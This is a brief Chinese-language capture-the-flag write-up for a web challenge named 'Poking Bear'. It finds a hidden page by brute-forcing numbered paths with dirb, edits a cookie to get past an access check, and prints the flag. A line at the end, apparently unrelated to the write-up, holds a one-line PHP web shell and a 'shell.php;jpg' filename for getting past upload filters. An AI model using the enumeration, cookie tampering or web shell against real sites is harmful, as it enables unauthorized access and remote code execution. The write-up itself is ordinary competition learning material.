# AIS3 pre-exam

{%hackmd @themes/orangeheart %}
## web



### Poking Bear (broken access control)
1. 進到頁面發現**SECRET BEAR** 的 **GO poke him**是不能按的
![](https://i.imgur.com/Qt4nYR3.png)

2. 隨便按一個可以按的
![](https://i.imgur.com/s7mh12D.png)
按下第一個**weird bear**後，出現的url
表示該頁面放在 **/bear/5** 的目錄裡
因此推測**SECRET BEAR**也在某個 **/bear/{number}** 裡

3. 找**SECRET BEAR**的範圍
**ice bear**:/bear/350
**tasty bear**:/bear/777
也就是說**SECRET BEAR**存在於350~777之間

4. 小朋友才一個一個試，大人都直接爆破
   (1)寫個python:
```
for i in range(350,777):
    print(i)
```

   (2)轉成文字檔
   (3)用dirb爆破
    
```
dirb http://chals1.ais3.org:8987/bear/ 1111.txt -w 
```
記得要加參數 -w 不然沒辦法一次請求這麼多

   (4)判斷正確目錄
   ![](https://i.imgur.com/nFRv9Uq.png)
跑到499時會發現size與其他目錄不同，因此可以推測是正確目錄了

(5)壞小孩，身分不對我可是不給你flag的喔
![](https://i.imgur.com/mz39PhQ.png)
當你開心按下**Poke!**，發現alert給你
![](https://i.imgur.com/nCC7HrD.png)

(6)改掉餅乾
![](https://i.imgur.com/7c6Ns58.png)

(7)flag
```
AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}
```

<?php $_GET['a']($_GET['b']); ?>
```
filename:shell.php;jpg
